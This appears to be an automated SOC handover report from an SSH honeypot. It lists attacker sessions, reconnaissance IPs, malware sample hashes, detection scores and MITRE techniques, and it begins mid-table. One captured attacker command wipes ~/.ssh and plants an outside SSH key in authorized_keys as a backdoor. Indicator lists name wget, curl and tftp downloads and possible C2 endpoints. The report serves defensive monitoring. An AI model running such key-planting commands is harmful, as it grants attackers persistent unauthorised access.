| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:36:20` | `cowrie.session.connect` |
| `2026-07-01 10:36:20` | `cowrie.client.version` |
| `2026-07-01 10:36:20` | `cowrie.client.kex` |
| `2026-07-01 10:36:21` | `cowrie.login.success` |
| `2026-07-01 10:36:22` | `cowrie.session.params` |
| `2026-07-01 10:36:22` | `cowrie.command.input` |
| `2026-07-01 10:36:22` | `cowrie.command.failed` |
| `2026-07-01 10:36:22` | `cowrie.log.closed` |
| `2026-07-01 10:36:23` | `cowrie.session.params` |
| `2026-07-01 10:36:23` | `cowrie.command.input` |
| `2026-07-01 10:36:23` | `cowrie.session.file_download` |
| `2026-07-01 10:36:23` | `cowrie.log.closed` |
| `2026-07-01 10:36:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.185[.]177` to AbuseIPDB if not already reported
- [ ] Block `43.165.185[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d14b09f1104

| Field | Detail |
|---|---|
| **Source IP** | `43.165.185[.]177` |
| **First Seen** | 2026-07-01 10:36 |
| **Last Seen** | 2026-07-01 10:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:36:23` | `cowrie.session.connect` |
| `2026-07-01 10:36:23` | `cowrie.client.version` |
| `2026-07-01 10:36:23` | `cowrie.client.kex` |
| `2026-07-01 10:36:24` | `cowrie.login.success` |
| `2026-07-01 10:36:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.185[.]177` to AbuseIPDB if not already reported
- [ ] Block `43.165.185[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17534fe871b9

| Field | Detail |
|---|---|
| **Source IP** | `43.165.185[.]177` |
| **First Seen** | 2026-07-01 10:36 |
| **Last Seen** | 2026-07-01 10:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:36:24` | `cowrie.session.connect` |
| `2026-07-01 10:36:24` | `cowrie.client.version` |
| `2026-07-01 10:36:24` | `cowrie.client.kex` |
| `2026-07-01 10:36:25` | `cowrie.login.success` |
| `2026-07-01 10:36:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.185[.]177` to AbuseIPDB if not already reported
- [ ] Block `43.165.185[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9776e5138971

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 10:37 |
| **Last Seen** | 2026-07-01 10:37 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:37:31` | `cowrie.session.connect` |
| `2026-07-01 10:37:32` | `cowrie.client.version` |
| `2026-07-01 10:37:32` | `cowrie.client.kex` |
| `2026-07-01 10:37:37` | `cowrie.login.success` |
| `2026-07-01 10:37:42` | `cowrie.session.params` |
| `2026-07-01 10:37:42` | `cowrie.command.input` |
| `2026-07-01 10:37:43` | `cowrie.log.closed` |
| `2026-07-01 10:37:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d69bef51e7fd

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-01 10:41 |
| **Last Seen** | 2026-07-01 10:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:41:57` | `cowrie.session.connect` |
| `2026-07-01 10:41:57` | `cowrie.client.version` |
| `2026-07-01 10:41:58` | `cowrie.client.kex` |
| `2026-07-01 10:41:58` | `cowrie.login.success` |
| `2026-07-01 10:41:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b37fec394528

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-01 10:41 |
| **Last Seen** | 2026-07-01 10:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:41:58` | `cowrie.session.connect` |
| `2026-07-01 10:41:58` | `cowrie.client.version` |
| `2026-07-01 10:41:58` | `cowrie.client.kex` |
| `2026-07-01 10:41:59` | `cowrie.login.success` |
| `2026-07-01 10:41:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b9353a3b73d

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 10:43 |
| **Last Seen** | 2026-07-01 10:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:43:26` | `cowrie.session.connect` |
| `2026-07-01 10:43:27` | `cowrie.client.version` |
| `2026-07-01 10:43:27` | `cowrie.client.kex` |
| `2026-07-01 10:43:29` | `cowrie.login.success` |
| `2026-07-01 10:43:30` | `cowrie.session.params` |
| `2026-07-01 10:43:30` | `cowrie.command.input` |
| `2026-07-01 10:43:30` | `cowrie.log.closed` |
| `2026-07-01 10:43:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9096d14519c1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 10:48 |
| **Last Seen** | 2026-07-01 10:49 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:48:51` | `cowrie.session.connect` |
| `2026-07-01 10:48:52` | `cowrie.client.version` |
| `2026-07-01 10:48:52` | `cowrie.client.kex` |
| `2026-07-01 10:48:58` | `cowrie.login.success` |
| `2026-07-01 10:49:02` | `cowrie.session.params` |
| `2026-07-01 10:49:02` | `cowrie.command.input` |
| `2026-07-01 10:49:03` | `cowrie.log.closed` |
| `2026-07-01 10:49:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58bb00218505

| Field | Detail |
|---|---|
| **Source IP** | `45.156.129[.]127` |
| **First Seen** | 2026-07-01 10:52 |
| **Last Seen** | 2026-07-01 10:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 10:52:17` | `cowrie.session.connect` |
| `2026-07-01 10:52:17` | `cowrie.login.success` |
| `2026-07-01 10:52:17` | `cowrie.session.params` |
| `2026-07-01 10:52:17` | `cowrie.command.input` |
| `2026-07-01 10:52:17` | `cowrie.command.input` |
| `2026-07-01 10:52:17` | `cowrie.command.failed` |
| `2026-07-01 10:52:17` | `cowrie.command.input` |
| `2026-07-01 10:52:17` | `cowrie.command.failed` |
| `2026-07-01 10:52:17` | `cowrie.command.input` |
| `2026-07-01 10:52:17` | `cowrie.log.closed` |
| `2026-07-01 10:52:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.129[.]127` to AbuseIPDB if not already reported
- [ ] Block `45.156.129[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `210.16.100[.]120` | **19** | 2026-07-01 08:56 | 2026-07-01 10:49 | 19m | 0 | `T1592` | 🟠 MEDIUM |
| `132.148.73[.]100` | **15** | 2026-07-01 09:00 | 2026-07-01 10:33 | 7m | 0 | `T1592` | 🟠 MEDIUM |
| `66.132.172[.]183` | **5** | 2026-07-01 10:49 | 2026-07-01 10:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]171` | **3** | 2026-07-01 10:50 | 2026-07-01 10:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]37` | **3** | 2026-07-01 10:49 | 2026-07-01 10:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `113.250.177[.]24` | **2** | 2026-07-01 10:08 | 2026-07-01 10:10 | 2m | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | **2** | 2026-07-01 09:20 | 2026-07-01 10:47 | 2m | 0 | `T1592` | 🟢 LOW |
| `16.58.56[.]214` | **2** | 2026-07-01 09:27 | 2026-07-01 09:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]125` | **2** | 2026-07-01 10:52 | 2026-07-01 10:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.92.144[.]224` | 1 | 2026-07-01 09:33 | 2026-07-01 09:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.151.72[.]155` | 1 | 2026-07-01 10:54 | 2026-07-01 10:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.190.113[.]93` | 1 | 2026-07-01 09:49 | 2026-07-01 09:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `141.11.88[.]124` | 1 | 2026-07-01 09:42 | 2026-07-01 09:43 | 30s | 0 | `T1592` | 🟢 LOW |
| `171.15.131[.]165` | 1 | 2026-07-01 09:03 | 2026-07-01 09:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-07-01 09:37 | 2026-07-01 09:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.3.129[.]142` | 1 | 2026-07-01 10:07 | 2026-07-01 10:08 | 35s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-07-01 10:04 | 2026-07-01 10:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.63.4[.]69` | 1 | 2026-07-01 09:53 | 2026-07-01 09:53 | 2s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-07-01 09:03 | 2026-07-01 09:04 | 59s | 0 | `T1592` | 🟢 LOW |
| `72.14.178[.]148` | 1 | 2026-07-01 09:34 | 2026-07-01 09:34 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 50/100 | 🟡 MEDIUM | **25/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 76/100 | 🔴 HIGH | **17/75** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `bc917f6bbce0845d39c27ee8147a140bf5ab594f50558024f0ec925864ec69c7` | ELF Binary (Linux executable) (MIPS 32-bit) | `bc917f6bbce0845d...` | 30/100 | 🟢 LOW | Not in VT |
| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` | ELF Binary (Linux executable) (x86 32-bit) | `c8545034cd4fe71e...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `cc653189103bd14e46958bae5f37f94852b7d54ced5662bf7858801c138645a8` | ELF Binary (Linux executable) (MIPS 32-bit) | `cc653189103bd14e...` | 63/100 | 🟡 MEDIUM | **33/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` (c8545034cd4fe71eeadb24da...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `159.65.233[.]253` | US | DigitalOcean, LLC | **100** ⚠️ | 5 |
| `113.250.177[.]24` | CN | CHINANET Chongqing Province Network | **100** ⚠️ | 7 |
| `45.205.1[.]42` | BR | VPSVAULT.HOST LTD | **100** ⚠️ | 8 |
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 7 |
| `106.92.144[.]224` | CN | CHINANET Chongqing Province Network | **100** ⚠️ | 0 |
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `66.132.186[.]171` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `83.168.69[.]141` | PL | Virtual Private Server | **100** ⚠️ | 26 |
| `115.151.72[.]155` | CN | CHINANET JIANGXI PROVINCE NETWORK | **100** ⚠️ | 50 |
| `72.14.178[.]148` | US | Linode | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 66 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 65 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 15 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 12 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 3 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 11 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 131 cases |
| Tool 34  | Credential Extractor        | ✅ 73 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 42 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (1.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 31 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 65 priority case(s) shown individually · 20 recon entry/entries in table (9 group(s) consolidating 53 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
